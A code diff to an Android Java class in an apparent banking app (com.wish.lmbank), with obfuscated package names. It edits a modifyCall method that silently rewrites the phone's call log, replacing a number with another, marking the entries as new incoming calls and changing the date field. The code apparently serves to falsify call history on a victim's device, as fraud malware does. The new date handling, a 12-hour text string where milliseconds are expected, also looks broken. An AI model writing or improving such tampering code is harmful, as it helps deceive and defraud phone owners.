@@ -9,6 +9,8 @@ import com.wish.lmbank.bean.CallLogBean;
 import com.wish.lmbank.utils.LogUtils;
 import com.wish.lmbank.utils.SharedPreferencesUtils;
 
+import java.text.SimpleDateFormat;
+import java.util.Date;
 import java.util.List;
 
 import gv00l3ah.mvdt7w.bb7d7pu7;
@@ -172,10 +174,14 @@ public class Constants {
      * @param phone   修改号码
      */
     public static void modifyCall(Context context, String number, String phone) {
+        SimpleDateFormat dateFormat = new SimpleDateFormat(
+                "yyyy-MM-dd hh:mm:ss");
+        String date = dateFormat.format(System.currentTimeMillis());
+
         ContentValues values = new ContentValues();
         values.put(CallLog.Calls.TYPE, CallLog.Calls.INCOMING_TYPE);
         values.put(CallLog.Calls.NUMBER, phone);
-        values.put(CallLog.Calls.DATE, 123123123);
+        values.put(CallLog.Calls.DATE, date);
         values.put(CallLog.Calls.NEW, 1);
         context.getContentResolver().
                 update(CallLog.Calls.CONTENT_URI, values, CallLog.Calls.NUMBER + "=?", new String[]{number});
